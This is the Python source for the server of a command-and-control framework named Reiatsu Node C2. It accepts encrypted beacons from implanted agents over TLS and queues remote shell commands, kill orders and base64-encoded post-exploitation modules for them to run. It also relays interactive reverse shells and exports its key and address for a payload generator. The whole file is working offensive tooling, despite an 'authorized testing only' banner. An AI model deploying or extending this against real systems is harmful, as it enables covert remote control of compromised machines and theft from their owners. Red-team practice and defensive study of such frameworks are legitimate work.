import socket
import threading
import time
import json
import uuid
import struct
import importlib
import sys
import pkgutil
import os
import ssl
import base64
import select
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import inspect

# Cross-platform readline support
try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

# ANSI Color Codes
RESET, BOLD, RED, GREEN, YELLOW, BLUE, CYAN, MAGENTA = '\033[0m', '\033[1m', '\033[31m', '\033[32m', '\033[33m', '\033[34m', '\033[36m', '\033[35m'

class DecryptionError(Exception): 
    """Custom exception for decryption failures"""
    pass

class CryptoUtils:
    """AES-256-GCM encryption utilities."""
    @staticmethod
    def encrypt(key, data):
        """Encrypt data using AES-256-GCM."""
        nonce = os.urandom(12)
        return nonce + AESGCM(key).encrypt(nonce, data, None)
    
    @staticmethod
    def decrypt(key, data):
        """Decrypt data using AES-256-GCM."""
        if len(data) < 12: 
            raise DecryptionError("Invalid ciphertext - too short")
        try: 
            return AESGCM(key).decrypt(data[:12], data[12:], None)
        except Exception as e: 
            raise DecryptionError("Decryption failed") from e
    
    @staticmethod
    def generate_strong_key(length=32): 
        """Generate a cryptographically strong random key."""
        return os.urandom(length)

class C2Server:
    """Main C2 server handling agent communications and session management."""
    SESSION_TIMEOUT = 120

    class BufferedSocket:
        """Socket wrapper allowing prepending data to receive buffer."""
        def __init__(self, sock, initial_buffer=b''):
            self._sock = sock
            self._buffer = initial_buffer

        def recv(self, bufsize):
            if self._buffer:
                data = self._buffer[:bufsize]
                self._buffer = self._buffer[bufsize:]
                return data
            return self._sock.recv(bufsize)

        def sendall(self, data):
            return self._sock.sendall(data)
        
        def close(self):
            return self._sock.close()
        
        @property
        def _closed(self):
            return self._sock._closed

    def __init__(self, host, port, ssl_cert, ssl_key):
        """Initialize the C2 server with SSL/TLS support."""
        self.host, self.port, self.ssl_cert, self.ssl_key = host, port, ssl_cert, ssl_key
        self.key = self._get_or_create_key()
        self._write_server_state()
        self.sessions, self.lock, self.shutdown_event = {}, threading.Lock(), threading.Event()
        self.shell_operator = OperatorShell(self)
        
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile=self.ssl_cert, keyfile=self.ssl_key)
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((self.host, self.port))
        sock.listen(50)
        
        self.server = context.wrap_socket(sock, server_side=True)
        print(f'{BOLD}{CYAN}[+] Reiatsu C2 Listening on {YELLOW}{self.host}:{self.port}{RESET} (SSL/TLS Enabled)')

    def _get_or_create_key(self):
        """Generate or load the AES encryption key."""
        key_file = os.path.join(os.path.dirname(__file__), '..', 'reiatsu.key')
        try:
            if os.path.exists(key_file) and os.path.getsize(key_file) == 32:
                with open(key_file, "rb") as f: 
                    return f.read()
            key = CryptoUtils.generate_strong_key()
            with open(key_file, "wb") as f: 
                f.write(key)
            return key
        except Exception as e: 
            print(f"{RED}[-] FATAL: Key management failed: {e}{RESET}")
            sys.exit(1)

    def _write_server_state(self):
        """Write server config to JSON for payload generator."""
        try:
            state = {
                'c2_ip': self.host, 
                'c2_port': self.port, 
                'aes_key_b64': base64.b64encode(self.key).decode()
            }
            with open(os.path.join(os.path.dirname(__file__), '..', 'server_state.json'), 'w') as f: 
                json.dump(state, f, indent=4)
        except Exception: 
            pass

    def send_with_length(self, sock, data): 
        """Send data with 4-byte length prefix."""
        sock.sendall(struct.pack('>I', len(data)) + data)
    
    def recv_with_length(self, sock):
        """Receive length-prefixed data."""
        try:
            raw_len = sock.recv(4)
            if not raw_len: 
                return None
            msg_len = struct.unpack('>I', raw_len)[0]
            data = b''
            while len(data) < msg_len:
                more = sock.recv(msg_len - len(data))
                if not more: 
                    return None
                data += more
            return data
        except (socket.error, struct.error): 
            return None

    def handle_connection(self, client_socket, addr):
        """Handle incoming connections (beacon or interactive shell)."""
        initial_data = b''
        try:
            client_socket.settimeout(2.0)
            initial_data = client_socket.recv(1024)
            client_socket.settimeout(None)

            if not initial_data:
                client_socket.close()
                return

            if initial_data.strip().startswith(b"SHELL_INIT:"):
                self.shell_operator.handle_interactive_shell_connection(client_socket, initial_data)
            else:
                buffered_sock = self.BufferedSocket(client_socket, initial_data)
                self.handle_beacon(buffered_sock, addr)

        except socket.timeout:
            client_socket.close()
        except (socket.error, ssl.SSLError) as e:
            if 'timed out' not in str(e).lower():
                self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Connection from {addr[0]} failed SSL handshake.{RESET}")
            if not client_socket._closed: 
                client_socket.close()
        except Exception as e:
            self.shell_operator.print_with_prompt_restore(f"{RED}[-] Error in connection handler: {e}{RESET}")
            if not client_socket._closed: 
                client_socket.close()

    def handle_beacon(self, sock, addr):
        """Process an agent beacon."""
        try:
            encrypted_beacon = self.recv_with_length(sock)
            if not encrypted_beacon: 
                return
            
            beacon = json.loads(CryptoUtils.decrypt(self.key, encrypted_beacon).decode())
            agent_id = beacon.get('id')
            results = beacon.get('results', [])
            
            if not agent_id: 
                return

            with self.lock:
                if agent_id not in self.sessions:
                    self.shell_operator.print_with_prompt_restore(f"\n{GREEN}{BOLD}[+] New Agent Check-in: {BLUE}{agent_id}{RESET} from {YELLOW}{addr[0]}{RESET}")
                    self.sessions[agent_id] = {
                        'id': agent_id, 
                        'ip': addr[0], 
                        'online': True, 
                        'last_seen': time.time(), 
                        'tasks': [], 
                        'results': []
                    }
                
                session = self.sessions[agent_id]
                session.update({
                    'online': True, 
                    'last_seen': time.time(), 
                    'metadata': beacon.get('metadata', session.get('metadata', {}))
                })
                
                if results:
                    self.shell_operator.print_with_prompt_restore(f"{CYAN}[*] Received {len(results)} result(s) from agent {BLUE}{agent_id}{RESET}")
                    session['results'].extend(results)

                tasks_to_send = session['tasks']
                session['tasks'] = []

            response = {'tasks': tasks_to_send}
            encrypted_response = CryptoUtils.encrypt(self.key, json.dumps(response).encode())
            self.send_with_length(sock, encrypted_response)

        except DecryptionError:
            self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Invalid beacon from {addr[0]}. Potential scanning.{RESET}")
        except (json.JSONDecodeError, UnicodeDecodeError):
            self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Failed to decode beacon from {addr[0]}.{RESET}")
        except Exception:
            pass
        finally:
            sock.close()

    def run(self):
        """Start the C2 server and operator interface."""
        self.shell_operator.print_banner()
        self.start_accept_loop()
        self.start_session_monitor()
        try:
            self.shell_operator.cmdloop()
        except KeyboardInterrupt:
            self.shutdown()

    def start_accept_loop(self):
        """Start the connection acceptance loop."""
        def loop():
            self.server.settimeout(1.0)
            while not self.shutdown_event.is_set():
                try:
                    client, addr = self.server.accept()
                    threading.Thread(target=self.handle_connection, args=(client, addr), daemon=True).start()
                except socket.timeout:
                    continue
                except Exception:
                    if not self.shutdown_event.is_set(): 
                        self.shutdown()
        threading.Thread(target=loop, daemon=True).start()

    def start_session_monitor(self):
        """Start session monitoring thread for cleanup."""
        def monitor():
            while not self.shutdown_event.is_set():
                time.sleep(30)
                current_time = time.time()
                with self.lock:
                    for agent_id, session in list(self.sessions.items()):
                        if current_time - session['last_seen'] > self.SESSION_TIMEOUT:
                            if session['online']:
                                session['online'] = False
                                self.shell_operator.print_with_prompt_restore(f"{YELLOW}[!] Agent {BLUE}{agent_id}{RESET} marked as offline.{RESET}")
        threading.Thread(target=monitor, daemon=True).start()

    def shutdown(self):
        """Gracefully shutdown the C2 server."""
        print(f"\n{RED}[!] Shutting down Reiatsu C2 server...{RESET}")
        self.shutdown_event.set()
        self.server.close()
        sys.exit(0)

class OperatorShell:
    """Interactive CLI for the C2 operator."""
    PROMPT_STR, COMMANDS = "reiatsu", ['sessions', 'shell', 'interactive_shell', 'info', 'results', 'module', 'modules', 'kill', 'generate', 'help', '?', 'exit', 'quit', 'clear']
    PROMPT = f'{BOLD}{MAGENTA}{PROMPT_STR}> {RESET}'

    def __init__(self, server):
        self.server = server
        self.discover_modules()

    def print_with_prompt_restore(self, msg):
        """Print message and restore prompt."""
        print(f"\n{msg}")
        print(self.PROMPT, end='', flush=True)

    def completer(self, text, state):
        """Command completion for readline."""
        options = [i for i in self.COMMANDS if i.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    def cmdloop(self):
        """Main command loop."""
        if readline:
            readline.parse_and_bind("tab: complete")
            readline.set_completer(self.completer)
        while True:
            try:
                cmd = input(self.PROMPT).strip()
                if cmd:
                    self.handle_command(cmd)
            except (EOFError, KeyboardInterrupt):
                print(f"\n{RED}[!] Exiting...{RESET}")
                break

    def discover_modules(self):
        """Discover available post-exploitation modules."""
        self.modules = {}
        modules_dir = os.path.join(os.path.dirname(__file__), '..', 'modules')
        try:
            for _, name, _ in pkgutil.iter_modules([modules_dir]):
                if name != '__init__':
                    try:
                        module = importlib.import_module(f'modules.{name}')
                        for attr_name in dir(module):
                            attr = getattr(module, attr_name)
                            if isinstance(attr, type) and hasattr(attr, 'run_remote'):
                                self.modules[name] = attr
                                break
                    except Exception:
                        continue
        except Exception:
            pass

    def handle_command(self, cmd):
        """Process operator commands."""
        parts = cmd.split()
        if not parts:
            return
        
        command = parts[0].lower()
        
        if command in ['sessions', 's']:
            self.list_sessions()
        elif command in ['shell']:
            if len(parts) >= 3:
                self.run_simple_shell(parts[1], ' '.join(parts[2:]))
            else:
                print(f"{RED}[-] Usage: shell <agent_id> <command>{RESET}")
        elif command in ['interactive_shell', 'is']:
            if len(parts) >= 2:
                self.queue_task(parts[1], {'type': 'interactive_shell'}, "Interactive Shell")
            else:
                print(f"{RED}[-] Usage: interactive_shell <agent_id>{RESET}")
        elif command in ['info']:
            if len(parts) >= 2:
                self.show_info(parts[1])
            else:
                print(f"{RED}[-] Usage: info <agent_id>{RESET}")
        elif command in ['results', 'r']:
            if len(parts) >= 2:
                self.show_results(parts[1])
            else:
                print(f"{RED}[-] Usage: results <agent_id>{RESET}")
        elif command in ['module']:
            if len(parts) >= 2:
                self.run_module(' '.join(parts[1:]))
            else:
                print(f"{RED}[-] Usage: module <agent_id> <module_name> [args]{RESET}")
        elif command in ['modules', 'm']:
            self.print_modules()
        elif command in ['kill']:
            if len(parts) >= 2:
                self.queue_task(parts[1], {'type': 'kill'}, "Kill Agent")
            else:
                print(f"{RED}[-] Usage: kill <agent_id>{RESET}")
        elif command in ['generate', 'g']:
            print(f"{YELLOW}[!] Use 'python3 payload_generator.py' in a separate terminal.{RESET}")
        elif command in ['help', '?']:
            self.print_help()
        elif command in ['exit', 'quit']:
            print(f"{RED}[!] Exiting...{RESET}")
            sys.exit(0)
        elif command in ['clear']:
            os.system('clear' if os.name == 'posix' else 'cls')
        else:
            print(f"{RED}[-] Unknown command: {command}{RESET}")
            print(f"{YELLOW}[*] Type 'help' for available commands.{RESET}")

    def handle_interactive_shell_connection(self, shell_socket, initial_data):
        """Handle interactive shell connection from agent."""
        try:
            agent_id = initial_data.decode().split(':')[1].strip()
            print(f"\n{GREEN}{BOLD}[+] Interactive shell started with agent {BLUE}{agent_id}{RESET}")
            print(f"{YELLOW}[*] Type 'exit' to end session.{RESET}\n")
            
            shell_socket.setblocking(False)
            
            while True:
                ready, _, _ = select.select([shell_socket], [], [], 0.1)
                if ready:
                    data = shell_socket.recv(1024)
                    if not data:
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
                
                if select.select([sys.stdin], [], [], 0)[0]:
                    user_input = sys.stdin.readline()
                    if user_input.strip() == 'exit':
                        break
                    shell_socket.sendall(user_input.encode())
                    
        except Exception as e:
            print(f"\n{RED}[-] Interactive shell error: {e}{RESET}")
        finally:
            shell_socket.close()
            print(f"\n{YELLOW}[*] Interactive shell session ended.{RESET}")
            print(self.PROMPT, end='', flush=True)

    def list_sessions(self):
        """Display all agent sessions."""
        with self.server.lock:
            if not self.server.sessions:
                print(f"{YELLOW}[!] No agent sessions found.{RESET}")
                return
            
            print(f"\n{BOLD}{CYAN}Active Agent Sessions:{RESET}")
            print(f"{'ID':<36} {'IP':<15} {'Status':<8} {'Last Seen':<20}")
            print("-" * 80)
            
            for agent_id, session in self.server.sessions.items():
                status = f"{GREEN}ONLINE{RESET}" if session['online'] else f"{RED}OFFLINE{RESET}"
                last_seen = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session['last_seen']))
                print(f"{agent_id:<36} {session['ip']:<15} {status:<8} {last_seen:<20}")

    def show_info(self, agent_id):
        """Display agent information."""
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            session = self.server.sessions[agent_id]
            print(f"\n{BOLD}{CYAN}Agent Information:{RESET}")
            print(f"  ID: {session['id']}")
            print(f"  IP: {session['ip']}")
            print(f"  Status: {'Online' if session['online'] else 'Offline'}")
            print(f"  Last Seen: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(session['last_seen']))}")
            
            if 'metadata' in session:
                metadata = session['metadata']
                print(f"  Hostname: {metadata.get('hostname', 'N/A')}")
                print(f"  User: {metadata.get('user', 'N/A')}")
                print(f"  Platform: {metadata.get('platform', 'N/A')}")
                print(f"  PID: {metadata.get('pid', 'N/A')}")

    def show_results(self, agent_id):
        """Display results from agent."""
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            session = self.server.sessions[agent_id]
            if not session['results']:
                print(f"{YELLOW}[!] No results available for agent {agent_id}.{RESET}")
                return
            
            print(f"\n{BOLD}{CYAN}Results from Agent {agent_id}:{RESET}")
            for i, result in enumerate(session['results'], 1):
                print(f"\n--- Result {i} ---")
                print(f"Task ID: {result.get('task_id', 'N/A')}")
                print(f"Type: {result.get('type', 'N/A')}")
                print(f"Output:\n{result.get('output', 'No output')}")

    def run_simple_shell(self, agent_id, command):
        """Execute shell command on agent."""
        self.queue_task(agent_id, {'type': 'shell', 'command': command}, f"Shell: {command}")

    def run_module(self, args):
        """Execute post-exploitation module on agent."""
        parts = args.split()
        if len(parts) < 2:
            print(f"{RED}[-] Usage: module <agent_id> <module_name> [args]{RESET}")
            return
        agent_id = parts[0]
        module_name = parts[1]
        module_args = ' '.join(parts[2:]) if len(parts) > 2 else ""
        if module_name not in self.modules:
            print(f"{RED}[-] Module '{module_name}' not found.{RESET}")
            return
        module_class = self.modules[module_name]
        try:
            module_code = inspect.getsource(module_class)
            encoded_code = base64.b64encode(module_code.encode()).decode()
            self.queue_task(agent_id, {
                'type': 'module',
                'module_code': encoded_code,
                'args': module_args
            }, f"Module: {module_name}")
        except Exception as e:
            print(f"{RED}[-] Failed to execute module: {e}{RESET}")

    def print_modules(self):
        """Display available modules."""
        if not self.modules:
            print(f"{YELLOW}[!] No modules found.{RESET}")
            return
        
        print(f"\n{BOLD}{CYAN}Available Modules:{RESET}")
        for name, module_class in self.modules.items():
            doc = module_class.__doc__ or "No description available"
            print(f"  {name:<15} - {doc.split('.')[0]}")

    def queue_task(self, agent_id, task_dict, task_name="Task"):
        """Queue task for agent execution."""
        with self.server.lock:
            if agent_id not in self.server.sessions:
                print(f"{RED}[-] Agent {agent_id} not found.{RESET}")
                return
            
            if not self.server.sessions[agent_id]['online']:
                print(f"{YELLOW}[!] Agent {agent_id} is offline. Task queued.{RESET}")
            
            task_dict['task_id'] = str(uuid.uuid4())
            self.server.sessions[agent_id]['tasks'].append(task_dict)
            print(f"{GREEN}[+] Queued {task_name} for agent {agent_id}{RESET}")

    def print_help(self):
        """Display help information."""
        help_text = f"""
{BOLD}{CYAN}Reiatsu Node C2 - Available Commands:{RESET}

{BOLD}Session Management:{RESET}
  sessions, s                    - List all agent sessions
  info <agent_id>               - Show agent information
  results, r <agent_id>         - Show results from agent

{BOLD}Command Execution:{RESET}
  shell <agent_id> <command>    - Execute shell command
  interactive_shell, is <agent_id> - Start interactive PTY shell

{BOLD}Module System:{RESET}
  modules, m                    - List available modules
  module <agent_id> <name> [args] - Execute module on agent

{BOLD}Agent Control:{RESET}
  kill <agent_id>               - Terminate agent

{BOLD}Utility:{RESET}
  generate, g                   - Generate payload (use separate terminal)
  clear                         - Clear terminal
  help, ?                       - Show this help
  exit, quit                    - Exit server
"""
        print(help_text)

    def print_banner(self):
        """Display the Reiatsu C2 banner."""
        banner = f"""
{BOLD}{MAGENTA}
██████╗ ███████╗██╗ █████╗ ████████╗███████╗██╗   ██╗
██╔══██╗██╔════╝██║██╔══██╗╚══██╔══╝██╔════╝██║   ██║
██████╔╝█████╗  ██║███████║   ██║   ███████╗██║   ██║
██╔══██╗██╔══╝  ██║██╔══██║   ██║   ╚════██║██║   ██║
██║  ██║███████╗██║██║  ██║   ██║   ███████║╚██████╔╝
╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ 
{RESET}
{BOLD}{CYAN}Reiatsu Node C2 Framework - v1.0{RESET}
{BOLD}{YELLOW}For authorized testing only{RESET}
{CYAN}By: ryuk27{RESET}

Type 'help' for available commands.
"""
        print(banner)